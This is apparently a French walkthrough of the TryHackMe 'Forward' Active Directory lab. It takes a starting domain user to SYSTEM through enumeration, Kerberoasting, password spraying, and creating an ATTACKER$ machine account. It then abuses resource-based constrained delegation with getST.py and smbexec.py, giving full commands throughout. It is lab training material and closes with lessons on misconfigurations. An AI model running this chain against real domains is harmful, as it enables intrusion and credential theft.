# TryHackMe — Forward

## Objectif

Room Active Directory en scénario **assumed breach** : les identifiants d'un premier utilisateur du domaine sont déjà fournis.

Point de départ :

```text
Domain : ctf.local
User   : j.smith
Pass   : JSmith@IT2024
Target : DC01.ctf.local
```

Objectif :

```text
j.smith
   ↓
énumération
   ↓
mouvement latéral
   ↓
élévation de privilèges
   ↓
Administrator / SYSTEM
```

---

# 1. Reconnaissance réseau

On commence par identifier les services exposés :

```bash
nmap -sV -sC TARGET_IP
```

### Options

```text
-sV → détection des services et versions
-sC → scripts Nmap standards d'énumération
```

Résultats principaux :

```text
53    DNS
88    Kerberos
135   RPC
139   NetBIOS
389   LDAP
445   SMB
464   Kerberos password
636   LDAPS
3268  Global Catalog LDAP
3269  Global Catalog LDAPS
3389  RDP
```

Nmap identifie également :

```text
Computer : DC01
Domain   : ctf.local
OS       : Windows Server 2019
```

La combinaison :

```text
DNS + Kerberos + LDAP + SMB + Global Catalog
```

est typique d'un **Domain Controller Active Directory**.

---

# 2. Validation du compte initial

On vérifie que les credentials fournis fonctionnent sur SMB :

```bash
netexec smb TARGET_IP \
-u j.smith \
-p 'JSmith@IT2024' \
-d ctf.local
```

Résultat :

```text
[+] ctf.local\j.smith:JSmith@IT2024
```

Le compte est valide.

### Pourquoi SMB ?

SMB permet rapidement de :

- vérifier des credentials Windows ;
- énumérer les partages ;
- accéder à des fichiers réseau ;
- obtenir diverses informations sur une machine Windows.

---

# 3. Énumération des partages SMB

```bash
netexec smb TARGET_IP \
-u j.smith \
-p 'JSmith@IT2024' \
-d ctf.local \
--shares
```

Partages trouvés :

```text
ADMIN$
C$
Downloads   READ
IPC$        READ
NETLOGON    READ
SYSVOL      READ
```

`ADMIN$` et `C$` nécessitent des privilèges administratifs.

`Downloads` est intéressant car il s'agit d'un partage personnalisé.

Connexion :

```bash
smbclient //TARGET_IP/Downloads \
-U 'ctf.local/j.smith%JSmith@IT2024'
```

Puis :

```text
ls
```

Le partage est vide.

### Conclusion

Cette piste ne fournit aucun nouveau fichier ou credential.

---

# 4. Énumération des utilisateurs Active Directory

LDAP permet d'interroger directement l'annuaire Active Directory.

```bash
netexec ldap TARGET_IP \
-u j.smith \
-p 'JSmith@IT2024' \
-d ctf.local \
--users
```

Utilisateurs trouvés :

```text
Administrator
Guest
krbtgt
j.smith
t.jones
r.williams
svc.helpdesk
```

Descriptions intéressantes :

```text
j.smith       → IT Staff
t.jones       → Help Desk
r.williams    → Help Desk Senior
svc.helpdesk  → HelpDesk Service Acct
```

`svc.helpdesk` attire l'attention car il s'agit d'un **compte de service**.

---

# 5. Recherche de SPN

Un compte de service peut posséder un **SPN — Service Principal Name**.

On vérifie :

```bash
GetUserSPNs.py \
-dc-ip TARGET_IP \
'ctf.local/j.smith:JSmith@IT2024'
```

Résultat :

```text
helpdesk/DC01
helpdesk/DC01.ctf.local

Account    : svc.helpdesk
Delegation : constrained
```

## Pourquoi un SPN est intéressant ?

Kerberos utilise les SPN pour identifier les services.

Exemple :

```text
cifs/DC01.ctf.local
http/web01.ctf.local
MSSQLSvc/sql01.ctf.local
```

Un utilisateur authentifié peut demander un **TGS** pour un compte ayant un SPN.

Cela rend `svc.helpdesk` potentiellement vulnérable au **Kerberoasting**.

---

# 6. Tentative de Kerberoasting

On demande le TGS :

```bash
GetUserSPNs.py \
-dc-ip TARGET_IP \
-request \
-outputfile helpdesk.hash \
'ctf.local/j.smith:JSmith@IT2024'
```

On obtient :

```text
$krb5tgs$23$*svc.helpdesk$CTF.LOCAL$...
```

`23` correspond à :

```text
Kerberos TGS-REP
etype 23
RC4-HMAC
```

Mode Hashcat associé :

```text
13100
```

Tentative :

```bash
hashcat -m 13100 \
helpdesk.hash \
/usr/share/wordlists/rockyou.txt
```

Résultat :

```text
Status...........: Exhausted
Recovered........: 0/1
```

### Conclusion

Le Kerberoasting fonctionne techniquement, mais le mot de passe de `svc.helpdesk` n'est pas dans `rockyou.txt`.

On abandonne cette piste plutôt que de lancer un brute-force arbitraire.

---

# 7. Accès RDP avec j.smith

RDP est exposé sur le port `3389`.

On vérifie les droits :

```bash
netexec rdp TARGET_IP \
-u j.smith \
-p 'JSmith@IT2024' \
-d ctf.local
```

Résultat :

```text
[+] ctf.local\j.smith:JSmith@IT2024 (Pwn3d!)
```

Connexion :

```bash
xfreerdp \
/v:TARGET_IP \
/u:j.smith \
/p:'JSmith@IT2024' \
/d:ctf.local \
/cert:ignore \
+clipboard \
/dynamic-resolution
```

---

# 8. Énumération locale de j.smith

Dans Windows :

```powershell
whoami
```

Résultat :

```text
ctf\j.smith
```

Puis :

```powershell
whoami /groups
```

On observe notamment :

```text
BUILTIN\Remote Desktop Users
CTF\AppLocker-Restricted
```

On inspecte ensuite le profil utilisateur :

```powershell
dir C:\Users\j.smith\Documents
```

Fichier intéressant :

```text
Database.kdbx
```

`.kdbx` est une base **KeePass**.

---

# 9. Analyse de Database.kdbx

Une première possibilité est de tenter de récupérer le mot de passe maître.

La base est copiée vers l'AttackBox puis convertie :

```bash
keepass2john Database.kdbx > keepass.hash
```

Le hash commence par :

```text
Database:$keepass$*4*600000*...
```

Tentative avec John :

```bash
john \
--wordlist=/usr/share/wordlists/rockyou.txt \
keepass.hash
```

Mais la base utilise un coût élevé :

```text
600000 rounds
~94 passwords/seconde
```

L'attaque complète de `rockyou.txt` prendrait environ deux jours.

### Mauvaise piste

Un lab de 120 minutes ne devrait pas demander plusieurs jours de cracking.

Il faut donc chercher une autre méthode.

---

# 10. KeePass protégé avec le compte Windows

KeePass est installé sur `DC01`.

On ouvre directement :

```text
C:\Users\j.smith\Documents\Database.kdbx
```

La base autorise l'utilisation du composant :

```text
Windows User Account
```

Comme notre session Windows est déjà :

```text
ctf\j.smith
```

KeePass peut utiliser le contexte cryptographique associé à cet utilisateur pour déverrouiller la base.

On n'a donc **pas besoin de casser le mot de passe maître**.

La base contient notamment des credentials pour :

```text
t.jones
```

Mot de passe :

```text
Helpdesk01!
```

---

# 11. Compromission de t.jones

Validation :

```bash
netexec smb TARGET_IP \
-u t.jones \
-p 'Helpdesk01!' \
-d ctf.local
```

Résultat :

```text
[+] ctf.local\t.jones:Helpdesk01!
```

Le credential est valide.

---

# 12. Vérification de la politique de mot de passe

Avant de tester une réutilisation de mot de passe :

```bash
netexec smb TARGET_IP \
-u t.jones \
-p 'Helpdesk01!' \
-d ctf.local \
--pass-pol
```

Résultat important :

```text
Account Lockout Threshold: None
```

Aucun verrouillage automatique des comptes n'est configuré après plusieurs échecs.

Dans un environnement réel, cette vérification est indispensable avant un **password spray**.

---

# 13. Password spraying

On connaît maintenant le mot de passe :

```text
Helpdesk01!
```

On cherche s'il a été réutilisé par d'autres utilisateurs.

Liste :

```bash
printf "j.smith\nt.jones\nr.williams\n" > users.txt
```

Password spray :

```bash
netexec smb TARGET_IP \
-u users.txt \
-p 'Helpdesk01!' \
-d ctf.local \
--continue-on-success
```

Résultat :

```text
[-] j.smith:Helpdesk01!      STATUS_LOGON_FAILURE
[+] t.jones:Helpdesk01!
[+] r.williams:Helpdesk01!
```

Donc :

```text
t.jones
   ↓ même password
r.williams
```

Le compte `r.williams` est maintenant compromis.

## Password spray vs brute-force

Password spray :

```text
user1 → PasswordA
user2 → PasswordA
user3 → PasswordA
```

Brute-force :

```text
user1 → PasswordA
user1 → PasswordB
user1 → PasswordC
...
```

Ici, on cherchait spécifiquement une **réutilisation de mot de passe**.

---

# 14. Analyse des ACL de DC01

On examine maintenant les permissions Active Directory de `r.williams` sur l'objet ordinateur du DC :

```bash
dacledit.py \
-action read \
-principal r.williams \
-target 'DC01$' \
-dc-ip TARGET_IP \
'ctf.local/r.williams:Helpdesk01!'
```

Résultat :

```text
ACE Type    : ACCESS_ALLOWED_OBJECT_ACE
Access mask : WriteProperty

Object type :
ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity

Trustee :
r.williams
```

C'est la vulnérabilité critique de la room.

## DACL / ACE

Une **DACL** contient plusieurs **ACE**.

Conceptuellement :

```text
DACL
 ├── ACE : Alice peut lire
 ├── ACE : Bob peut modifier
 └── ACE : r.williams peut modifier une propriété particulière
```

Ici :

```text
r.williams
      ↓
WriteProperty
      ↓
msDS-AllowedToActOnBehalfOfOtherIdentity
      ↓
DC01$
```

`DC01$` est l'objet ordinateur Active Directory correspondant à `DC01`.

---

# 15. Comprendre la RBCD

RBCD signifie :

```text
Resource-Based Constrained Delegation
```

L'attribut :

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

indique quelles identités sont autorisées à agir au nom d'autres utilisateurs auprès de la machine cible.

Le problème est donc :

```text
r.williams
     ↓
peut modifier cette propriété sur DC01$
```

Il peut donc décider qu'un compte contrôlé par l'attaquant est autorisé à effectuer de la délégation vers le Domain Controller.

---

# 16. Vérifier MachineAccountQuota

Il faut maintenant obtenir une identité Kerberos que nous contrôlons.

On vérifie si `r.williams` peut créer un compte ordinateur :

```bash
ldapsearch -x \
-H ldap://TARGET_IP \
-D 'r.williams@ctf.local' \
-w 'Helpdesk01!' \
-b 'DC=ctf,DC=local' \
-s base \
ms-DS-MachineAccountQuota
```

Résultat :

```text
ms-DS-MachineAccountQuota: 10
```

Cela signifie qu'un utilisateur standard peut créer jusqu'à **10 comptes ordinateur**.

---

# 17. Création d'un compte machine contrôlé

On crée :

```text
ATTACKER$
```

avec un mot de passe connu :

```bash
addcomputer.py \
-computer-name 'ATTACKER$' \
-computer-pass 'AttackPass123!' \
-dc-ip TARGET_IP \
'ctf.local/r.williams:Helpdesk01!'
```

Résultat :

```text
Successfully added machine account ATTACKER$
```

Nous possédons maintenant une identité Kerberos complètement contrôlée :

```text
ATTACKER$
Password : AttackPass123!
```

---

# 18. Configuration de la RBCD

État initial :

```bash
rbcd.py \
-delegate-to 'DC01$' \
-action read \
-dc-ip TARGET_IP \
'ctf.local/r.williams:Helpdesk01!'
```

Résultat :

```text
msDS-AllowedToActOnBehalfOfOtherIdentity is empty
```

On autorise ensuite `ATTACKER$` :

```bash
rbcd.py \
-delegate-from 'ATTACKER$' \
-delegate-to 'DC01$' \
-action write \
-dc-ip TARGET_IP \
'ctf.local/r.williams:Helpdesk01!'
```

Résultat :

```text
Delegation rights modified successfully!

ATTACKER$ can now impersonate users
on DC01$ via S4U2Proxy
```

Nous avons maintenant :

```text
ATTACKER$
    │
    │ autorisé par RBCD
    ▼
DC01$
```

---

# 19. Kerberos S4U

On veut maintenant obtenir un ticket représentant :

```text
Administrator
```

pour :

```text
cifs/DC01.ctf.local
```

On commence par s'assurer que le nom du DC est résolu :

```bash
echo 'TARGET_IP DC01.ctf.local DC01' >> /etc/hosts
```

Puis :

```bash
getST.py \
-dc-ip TARGET_IP \
-spn cifs/DC01.ctf.local \
-impersonate Administrator \
'ctf.local/ATTACKER$:AttackPass123!'
```

Résultat :

```text
Getting TGT for user
Impersonating Administrator
Requesting S4U2self
Requesting S4U2Proxy

Saving ticket in:
Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

---

# 20. S4U2Self et S4U2Proxy

## S4U2Self

`ATTACKER$` demande au KDC un ticket représentant :

```text
Administrator
```

auprès de son propre service.

Conceptuellement :

```text
ATTACKER$
    ↓
"Je veux représenter Administrator"
    ↓
S4U2Self
```

Le mot de passe d'Administrator n'est jamais nécessaire.

---

## S4U2Proxy

Ensuite `ATTACKER$` demande :

```text
"Je veux utiliser cette identité Administrator
auprès du service CIFS de DC01."
```

```text
Administrator
     ↓
S4U2Proxy
     ↓
cifs/DC01.ctf.local
```

Cela est accepté parce que `DC01$` contient maintenant dans sa configuration RBCD :

```text
ATTACKER$ autorisé
```

Le résultat final est donc un :

```text
TGS
User    : Administrator
Service : cifs/DC01.ctf.local
```

sans connaître le mot de passe Administrator.

---

# 21. Utilisation du ticket Kerberos

On indique aux outils Kerberos quel ticket utiliser :

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

Vérification :

```bash
klist
```

`KRB5CCNAME` signifie :

```text
Kerberos 5 Credential Cache Name
```

Il indique le fichier contenant les tickets Kerberos à utiliser.

---

# 22. Exécution distante avec smbexec

On possède maintenant un ticket Administrator valable pour CIFS.

```bash
smbexec.py \
-k \
-no-pass \
ctf.local/Administrator@DC01.ctf.local
```

Options :

```text
-k
→ utiliser Kerberos

-no-pass
→ ne pas demander de mot de passe
   car le ticket est déjà dans KRB5CCNAME
```

`smbexec.py` utilise SMB pour créer/exécuter un service distant.

Les services Windows s'exécutant généralement sous :

```text
NT AUTHORITY\SYSTEM
```

on obtient un shell privilégié.

Vérification :

```cmd
whoami
```

Résultat :

```text
nt authority\system
```

---

# 23. Flag Administrator

Le flag final se trouve dans :

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

`type` sous `cmd.exe` affiche le contenu d'un fichier, comme `cat` sous Linux.

Room terminée.

---

# Chaîne d'attaque complète

```text
Credentials initiaux
ctf.local\j.smith
        │
        ▼
Accès RDP à DC01
        │
        ▼
C:\Users\j.smith\Documents\Database.kdbx
        │
        ▼
KeePass ouvert avec Windows User Account
        │
        ▼
t.jones : Helpdesk01!
        │
        ▼
Password spraying
        │
        ▼
r.williams : Helpdesk01!
        │
        ▼
Analyse des ACL de DC01$
        │
        ▼
WriteProperty sur
msDS-AllowedToActOnBehalfOfOtherIdentity
        │
        ▼
MachineAccountQuota = 10
        │
        ▼
Création de ATTACKER$
        │
        ▼
RBCD :
ATTACKER$ autorisé sur DC01$
        │
        ▼
S4U2Self
        │
        ▼
S4U2Proxy
        │
        ▼
TGS Administrator
pour cifs/DC01.ctf.local
        │
        ▼
smbexec.py
        │
        ▼
NT AUTHORITY\SYSTEM
        │
        ▼
Administrator flag
```

---

# Points importants à retenir

## 1. Ne pas s'acharner sur une piste

Deux attaques de cracking ont été essayées :

```text
Kerberoasting de svc.helpdesk
KeePass avec rockyou.txt
```

Elles étaient techniquement valides, mais inefficaces.

Le bon réflexe est :

```text
tester
  ↓
évaluer le coût / les résultats
  ↓
abandonner si peu prometteur
  ↓
continuer l'énumération
```

---

## 2. Les credentials stockés localement sont critiques

Le compte `j.smith` n'était pas administrateur.

Mais sa session permettait d'accéder à :

```text
Database.kdbx
```

qui contenait le credential d'un autre utilisateur.

Une compromission de poste peut donc devenir une compromission de plusieurs identités.

---

## 3. La réutilisation de mots de passe permet le mouvement latéral

```text
t.jones      → Helpdesk01!
r.williams   → Helpdesk01!
```

Un compte faiblement privilégié peut conduire à un compte beaucoup plus intéressant simplement à cause du **password reuse**.

---

## 4. Les ACL Active Directory sont une surface d'attaque majeure

`r.williams` n'était pas Domain Admin.

Mais il possédait :

```text
WriteProperty
```

sur une propriété extrêmement sensible de `DC01$`.

En Active Directory :

```text
groupe privilégié
≠
seule manière d'avoir du pouvoir
```

Les ACL peuvent donner des capacités très importantes à des comptes qui paraissent ordinaires.

---

## 5. Comprendre RBCD

La vulnérabilité repose sur trois conditions :

```text
1. Contrôler une identité Kerberos
   → ATTACKER$

2. Pouvoir modifier
   msDS-AllowedToActOnBehalfOfOtherIdentity
   sur la cible

3. Configurer la cible pour faire confiance
   au compte contrôlé
```

Puis :

```text
S4U2Self
+
S4U2Proxy
=
impersonation d'un utilisateur
auprès d'un service autorisé
```

---

# TL;DR

```text
j.smith
  ↓ RDP
KeePass
  ↓
t.jones / Helpdesk01!
  ↓ password reuse
r.williams / Helpdesk01!
  ↓
WriteProperty sur la RBCD de DC01$
  ↓
création ATTACKER$
  ↓
ATTACKER$ autorisé via RBCD
  ↓
getST.py -impersonate Administrator
  ↓
TGS Administrator pour CIFS/DC01
  ↓
smbexec.py
  ↓
NT AUTHORITY\SYSTEM
```

La leçon principale de **Forward** est que la compromission complète du domaine ne vient pas d'un exploit logiciel complexe, mais d'une **chaîne de mauvaises configurations et de mauvaises pratiques** :

```text
credential exposure
→ password reuse
→ permissions AD dangereuses
→ MachineAccountQuota
→ RBCD
→ Kerberos delegation abuse
→ SYSTEM
```